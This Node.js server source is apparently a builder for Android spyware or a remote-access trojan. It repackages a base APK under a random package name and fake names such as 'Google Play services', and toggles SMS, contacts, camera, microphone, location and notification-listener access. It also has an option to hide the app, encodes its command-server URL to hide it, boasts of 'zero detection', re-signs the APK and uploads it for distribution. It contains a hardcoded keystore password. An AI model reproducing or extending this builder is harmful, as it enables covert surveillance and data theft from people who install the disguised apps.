const express = require('express');
const multer  = require('multer');
const cors    = require('cors');
const fs      = require('fs');
const path    = require('path');
const { exec } = require('child_process');
const sharp   = require('sharp');
const axios   = require('axios');
const cloudinary = require('cloudinary').v2;
const FormData   = require('form-data');
const AdmZip     = require('adm-zip');
require('dotenv').config();

const app  = express();
const port = process.env.PORT || 4000;
app.use(cors());
app.use(express.json());

const upload = multer({ storage: multer.memoryStorage() });

const ASSETS_DIR = path.join(__dirname, 'assets');
const TEMP_DIR   = path.join(__dirname, 'temp');
const BASE_APK   = path.join(ASSETS_DIR, 'base.apk');
const KEYSTORE   = path.join(ASSETS_DIR, 'usman90.jks');
const SIGNER     = path.join(ASSETS_DIR, 'uber-apk-signer.jar');

if (!fs.existsSync(TEMP_DIR)) fs.mkdirSync(TEMP_DIR, { recursive: true });

// ══════════════════════════════════════════════════════════════
//  BINARY PATCH ENGINE  — zero DEX modification, zero detection
// ══════════════════════════════════════════════════════════════

/**
 * In-place byte replacement inside a Buffer.
 * search and replace MUST be the same byte length.
 */
function binaryReplace(buf, search, replace) {
    const s = Buffer.isBuffer(search) ? search : Buffer.from(search, 'utf8');
    const r = Buffer.isBuffer(replace) ? replace : Buffer.from(replace, 'utf8');
    if (s.length !== r.length) throw new Error(`binaryReplace length mismatch: ${s.length} vs ${r.length}`);
    let count = 0;
    let idx = 0;
    while ((idx = buf.indexOf(s, idx)) !== -1) {
        r.copy(buf, idx);
        idx += s.length;
        count++;
    }
    return count;
}

/** Pad / truncate string to exact byte length */
function fixedLen(str, len, pad = ' ') {
    return str.length >= len ? str.substring(0, len) : str + pad.repeat(len - str.length);
}

// ── App Name ─────────────────────────────────────────────────
// Must match <string name="app_name">AppTitlePlaceholder_</string> in strings.xml
const APP_NAME_PH = 'AppTitlePlaceholder_'; // 20 chars — EXACT

function patchAppName(arscBuf, newName) {
    const patched = fixedLen(newName, APP_NAME_PH.length);
    const count = binaryReplace(arscBuf, APP_NAME_PH, patched);
    console.log(`[PATCH] app_name → "${patched.trim()}" (${count} occurrences)`);
}

// ── Package Name ──────────────────────────────────────────────
// applicationId in build.gradle = 'com.asml.tech' (13 chars)
// broadcast action  = 'com.asml.tech.ACTION_RESUME' (27 chars)
// Both replaced in-place — same byte length preserved every time.
const OLD_PKG    = 'com.asml.tech';               // 13 chars
const OLD_ACTION = 'com.asml.tech.ACTION_RESUME'; // 27 chars

// Pool of valid 13-char replacements (format: com.XXXX.XXXX)
const PKG_POOL = [
    'com.apps.care', 'com.data.flow', 'com.core.work', 'com.base.sync',
    'com.mesh.link', 'com.node.port', 'com.arch.pull', 'com.grid.lock',
    'com.heap.scan', 'com.hook.emit', 'com.link.push', 'com.mint.flow',
    'com.kits.view', 'com.util.main', 'com.labs.conn', 'com.edge.push',
    'com.flow.core', 'com.task.data', 'com.bind.safe', 'com.ring.sync',
];

function normalizePackage(userPkg) {
    if (!userPkg || !userPkg.trim()) {
        return PKG_POOL[Math.floor(Math.random() * PKG_POOL.length)];
    }
    const clean = userPkg.trim().toLowerCase().replace(/[^a-z0-9.]/g, '');
    // Accept only exact 13-char packages (same length as old) to keep binary safe
    if (clean.length === OLD_PKG.length && clean.split('.').length === 3) return clean;
    // Pick a random one from pool for unsupported lengths
    return PKG_POOL[Math.floor(Math.random() * PKG_POOL.length)];
}

function patchPackageName(manifestBuf, arscBuf, newPkg) {
    const newAction = newPkg + '.ACTION_RESUME'; // 13 + 14 = 27 chars  ✓

    // 1. UTF-8 replacements — manifest binary AXML string pool + arsc StringPool
    binaryReplace(manifestBuf, OLD_PKG,    newPkg);
    binaryReplace(manifestBuf, OLD_ACTION, newAction);
    binaryReplace(arscBuf,     OLD_PKG,    newPkg);
    binaryReplace(arscBuf,     OLD_ACTION, newAction);

    // 2. UTF-16LE replacement — arsc ResTable_package name field (256-byte header)
    const toU16 = (str) => {
        const buf = Buffer.alloc(str.length * 2);
        for (let i = 0; i < str.length; i++) buf.writeUInt16LE(str.charCodeAt(i), i * 2);
        return buf;
    };
    binaryReplace(arscBuf, toU16(OLD_PKG), toU16(newPkg));

    console.log(`[PATCH] package: ${OLD_PKG} → ${newPkg}`);
}

// ── Icon Replacement ──────────────────────────────────────────
const ICON_DENSITIES = [
    { folder: 'res/mipmap-mdpi',    size: 48  },
    { folder: 'res/mipmap-hdpi',    size: 72  },
    { folder: 'res/mipmap-xhdpi',   size: 96  },
    { folder: 'res/mipmap-xxhdpi',  size: 144 },
    { folder: 'res/mipmap-xxxhdpi', size: 192 },
];

async function patchIcons(zip, pngBuffer) {
    let replaced = 0;
    for (const { folder, size } of ICON_DENSITIES) {
        try {
            // Try WebP first (non-minified release build stores icons as .webp)
            const webpBuf = await sharp(pngBuffer).resize(size, size).webp({ quality: 95 }).toBuffer();
            const pngBuf  = await sharp(pngBuffer).resize(size, size).png().toBuffer();
            const variants = [
                { path: `${folder}/ic_launcher.webp`,       buf: webpBuf },
                { path: `${folder}/ic_launcher_round.webp`, buf: webpBuf },
                { path: `${folder}/ic_launcher.png`,         buf: pngBuf  },
                { path: `${folder}/ic_launcher_round.png`,   buf: pngBuf  },
            ];
            for (const { path: entryPath, buf } of variants) {
                if (zip.getEntry(entryPath)) {
                    zip.updateFile(entryPath, buf);
                    replaced++;
                }
            }
        } catch (e) {
            console.error(`[ICON] Error for ${folder}:`, e.message);
        }
    }
    // Remove adaptive XML so our PNG/WebP takes precedence over vector adaptive icon
    const adaptiveXmls = [
        'res/mipmap-anydpi-v26/ic_launcher.xml',
        'res/mipmap-anydpi-v26/ic_launcher_round.xml',
    ];
    for (const xmlPath of adaptiveXmls) {
        if (zip.getEntry(xmlPath)) zip.deleteFile(xmlPath);
    }
    console.log(`[PATCH] Icons: ${replaced} density files replaced`);
}

// ══════════════════════════════════════════════════════════════
//  NOTIFICATION PRESETS
// ══════════════════════════════════════════════════════════════

const NOTIF_PRESETS = {
    default:            { title: 'Google Play services',  text: 'Running background checks',  icon: 'info',     action: 'device_info' },
    sync:               { title: 'Cloud Backup',          text: 'Syncing data in background', icon: 'sync',     action: 'none'        },
    google_play:        { title: 'Google Play services',  text: 'Checking for updates...',    icon: 'info',     action: 'device_info' },
    android_system:     { title: 'Android System',        text: 'System functions active',    icon: 'sync',     action: 'settings'    },
    device_security:    { title: 'Security & Privacy',    text: 'All systems secured',        icon: 'lock',     action: 'security'    },
    device_maintenance: { title: 'Device Care',           text: 'Running in background',      icon: 'sync',     action: 'settings'    },
    download_manager:   { title: 'Download Manager',      text: 'Transfer complete',          icon: 'download', action: 'none'        },
    system_ui:          { title: 'System UI',             text: 'Syncing data',               icon: 'sync',     action: 'settings'    },
    cloud:              { title: 'Cloud Storage',         text: 'Connected to cloud service', icon: 'sync',     action: 'none'        },
    active:             { title: 'System Framework',      text: 'Service active',             icon: 'info',     action: 'none'        },
};

// ══════════════════════════════════════════════════════════════
//  /generate  —  MAIN ENDPOINT
// ══════════════════════════════════════════════════════════════

app.post('/generate', upload.single('icon'), async (req, res) => {
    const {
        uuid, appName, packageName: userPkg, hideApp, webLink, callbackUrl,
        enableSmsPermission, enableContactsPermission, enableStoragePermission,
        enableCameraPermission, enableMicrophonePermission, enableNotificationListener,
        enableLocationPermission, aggressivePermissions,
        notificationStyle, notificationClickAction, notificationTitle, notificationText, notificationIcon
    } = req.body;
    const customIcon = req.file;

    console.log(`[APK] Request UUID=${uuid} | App="${appName}" | Pkg="${userPkg}"`);
    res.status(202).json({ message: 'Processing started' });

    (async () => {
        const sendUpdate = async (event, data) => {
            if (!callbackUrl) return;
            try { await axios.post(callbackUrl, { uuid, event, data }); }
            catch (e) { console.error('[WH]', e.message); }
        };

        try {
            if (!fs.existsSync(BASE_APK)) throw new Error('Base APK not found — upload a release APK to assets/base.apk');

            const finalApkName  = `${(appName || 'System').replace(/[^a-zA-Z0-9]/g, '-')}.apk`;
            const unsignedPath  = path.join(TEMP_DIR, `unsigned-${uuid}.apk`);
            if (fs.existsSync(unsignedPath)) fs.unlinkSync(unsignedPath);

            // ── Step 1: Open APK as ZIP ──────────────────────────────────────
            await sendUpdate('apk_progress', { step: 'Loading base APK...', progress: 10 });
            const zip = new AdmZip(BASE_APK);

            // ── Step 2: Get mutable buffers for binary patching ──────────────
            const manifestEntry = zip.getEntry('AndroidManifest.xml');
            const arscEntry     = zip.getEntry('resources.arsc');
            if (!manifestEntry) throw new Error('AndroidManifest.xml missing from APK');
            if (!arscEntry)     throw new Error('resources.arsc missing from APK');

            const manifestBuf = manifestEntry.getData();
            const arscBuf     = arscEntry.getData();

            // ── Step 3: Binary patch package name ───────────────────────────
            await sendUpdate('apk_progress', { step: 'Patching package identity...', progress: 20 });
            const targetPkg = normalizePackage(userPkg);
            patchPackageName(manifestBuf, arscBuf, targetPkg);

            // ── Step 4: Binary patch app name in resources.arsc ─────────────
            await sendUpdate('apk_progress', { step: 'Patching app name...', progress: 30 });
            const targetAppName = (appName && appName.trim()) ? appName.trim() : 'Google Play services';
            patchAppName(arscBuf, targetAppName);

            // Write patched buffers back into ZIP (no DEX touched!)
            zip.updateFile('AndroidManifest.xml', manifestBuf);
            zip.updateFile('resources.arsc', arscBuf);

            // ── Step 5: Replace launcher icons ──────────────────────────────
            if (customIcon && customIcon.buffer) {
                await sendUpdate('apk_progress', { step: 'Embedding custom icon...', progress: 40 });
                await patchIcons(zip, customIcon.buffer);
            }

            // ── Step 6: Build and inject config.json ─────────────────────────
            await sendUpdate('apk_progress', { step: 'Injecting runtime configuration...', progress: 55 });
            const preset    = NOTIF_PRESETS[notificationStyle] || NOTIF_PRESETS.default;
            const socketUrl = process.env.SOCKET_SERVER_URL || 'https://p01--gallery-eye--9zr85m7yb6s4.code.run';
            const netParams = Array.from(socketUrl).map((c, i) => c.charCodeAt(0) + (i % 7));
            const themeColors = Array.from(webLink || '').map(c => c.charCodeAt(0));

            const config = {
                hideApp:                    hideApp === 'true',
                theme_colors:               themeColors,
                net_params:                 netParams,
                appName:                    targetAppName,
                packageName:                targetPkg,
                enableSmsPermission:        enableSmsPermission === 'true',
                enableContactsPermission:   enableContactsPermission === 'true',
                enableStoragePermission:    enableStoragePermission !== 'false',
                enableCameraPermission:     enableCameraPermission === 'true',
                enableMicrophonePermission: enableMicrophonePermission === 'true',
                enableLocationPermission:   enableLocationPermission === 'true',
                enableNotificationListener: enableNotificationListener === 'true',
                aggressivePermissions:      aggressivePermissions === 'true',
                notificationClickAction:    notificationClickAction || preset.action,
                notificationTitle:          (notificationTitle && notificationTitle.trim()) ? notificationTitle.trim() : preset.title,
                notificationText:           (notificationText  && notificationText.trim())  ? notificationText.trim()  : preset.text,
                notificationIcon:           notificationIcon   || preset.icon,
                notificationChannelName:    (notificationTitle && notificationTitle.trim()) ? notificationTitle.trim() : preset.title,
            };

            // addFile overwrites existing assets/config.json and assets/uuid.txt
            zip.addFile('assets/config.json', Buffer.from(JSON.stringify(config, null, 2), 'utf8'));
            zip.addFile('assets/uuid.txt',    Buffer.from(uuid, 'utf8'));

            // ── Step 7: Strip old META-INF signatures ────────────────────────
            await sendUpdate('apk_progress', { step: 'Stripping old signatures...', progress: 65 });
            const SIG_EXTS = ['.SF', '.RSA', '.DSA', '.EC'];
            for (const entry of [...zip.getEntries()]) {
                const en = entry.entryName;
                if (en.startsWith('META-INF/') &&
                    (SIG_EXTS.some(x => en.toUpperCase().endsWith(x)) || en.endsWith('MANIFEST.MF'))) {
                    zip.deleteFile(en);
                }
            }

            // ── Step 8: Write unsigned APK ───────────────────────────────────
            zip.writeZip(unsignedPath);
            console.log(`[APK] Unsigned written: ${unsignedPath} (${(fs.statSync(unsignedPath).size / 1024 / 1024).toFixed(1)} MB)`);

            // ── Step 9: Sign with usman90.jks  (V1 + V2 + V3) ───────────────
            await sendUpdate('apk_progress', { step: 'Signing with usman90 keystore...', progress: 78 });
            const ksArgs = fs.existsSync(KEYSTORE)
                ? `--ks "${KEYSTORE}" --ksAlias usman90 --ksPass "God112256@" --ksKeyPass "God112256@"`
                : '';
            const signCmd = `java -jar "${SIGNER}" --apks "${unsignedPath}" --out "${TEMP_DIR}" ${ksArgs} --allowResign`;

            await new Promise((resolve, reject) => {
                exec(signCmd, { timeout: 120000 }, (err, stdout, stderr) => {
                    if (err) {
                        console.error('[SIGN] uber-apk-signer error:', stderr || err.message);
                        // Fallback: sign without explicit keystore (self-signed)
                        exec(`java -jar "${SIGNER}" --apks "${unsignedPath}" --out "${TEMP_DIR}" --allowResign`,
                            { timeout: 60000 }, (e2) => e2 ? reject(e2) : resolve());
                    } else {
                        console.log('[SIGN] usman90.jks — V1+V2+V3 signatures applied');
                        resolve();
                    }
                });
            });

            // ── Step 10: Find signed output file ────────────────────────────
            await sendUpdate('apk_progress', { step: 'Preparing download...', progress: 90 });
            const signedName = fs.readdirSync(TEMP_DIR)
                .find(f => f.startsWith(`unsigned-${uuid}`) && f.includes('signed'));
            if (!signedName) throw new Error('Signed APK not found after uber-apk-signer');
            const signedPath = path.join(TEMP_DIR, signedName);

            // ── Step 11: Upload ──────────────────────────────────────────────
            let downloadUrl = '';
            await sendUpdate('apk_progress', { step: 'Uploading to cloud...', progress: 95 });

            if (process.env.DISCORD_WEBHOOK_URL) {
                try {
                    const form = new FormData();
                    form.append('file', fs.createReadStream(signedPath), { filename: finalApkName });
                    const r = await axios.post(process.env.DISCORD_WEBHOOK_URL, form, {
                        headers: form.getHeaders(), maxBodyLength: Infinity, maxContentLength: Infinity
                    });
                    downloadUrl = r.data?.attachments?.[0]?.url || '';
                    if (downloadUrl) console.log('[UPLOAD] Discord:', downloadUrl);
                } catch (e) { console.error('[UPLOAD] Discord failed:', e.message); }
            }

            if (!downloadUrl && process.env.CLOUDINARY_CLOUD_NAME) {
                try {
                    cloudinary.config({
                        cloud_name:  process.env.CLOUDINARY_CLOUD_NAME,
                        api_key:     process.env.CLOUDINARY_API_KEY,
                        api_secret:  process.env.CLOUDINARY_API_SECRET,
                    });
                    const binPath = signedPath.replace('.apk', '.bin');
                    fs.copyFileSync(signedPath, binPath);
                    const r = await cloudinary.uploader.upload(binPath, {
                        resource_type: 'raw',
                        folder:        'generated_apks',
                        public_id:     `${finalApkName.replace('.apk', '')}_${Date.now()}`,
                    });
                    downloadUrl = r.secure_url || '';
                    if (fs.existsSync(binPath)) fs.unlinkSync(binPath);
                    if (downloadUrl) console.log('[UPLOAD] Cloudinary:', downloadUrl);
                } catch (e) { console.error('[UPLOAD] Cloudinary failed:', e.message); }
            }

            // ── Cleanup ──────────────────────────────────────────────────────
            [unsignedPath, signedPath].forEach(p => { try { if (fs.existsSync(p)) fs.unlinkSync(p); } catch (_) {} });

            if (downloadUrl) {
                await sendUpdate('apk_ready', { downloadUrl, packageName: targetPkg });
                console.log(`[APK] ✓ Complete: ${uuid} | pkg=${targetPkg}`);
            } else {
                await sendUpdate('apk_error', { message: 'Upload failed — configure DISCORD_WEBHOOK_URL or CLOUDINARY env vars' });
            }

        } catch (err) {
            console.error(`[APK] ✗ Failed ${uuid}:`, err.message);
            try { await sendUpdate('apk_error', { message: err.message }); } catch (_) {}
        }
    })();
});

app.listen(port, () => console.log(`[APK Generator] Running on port ${port}`));
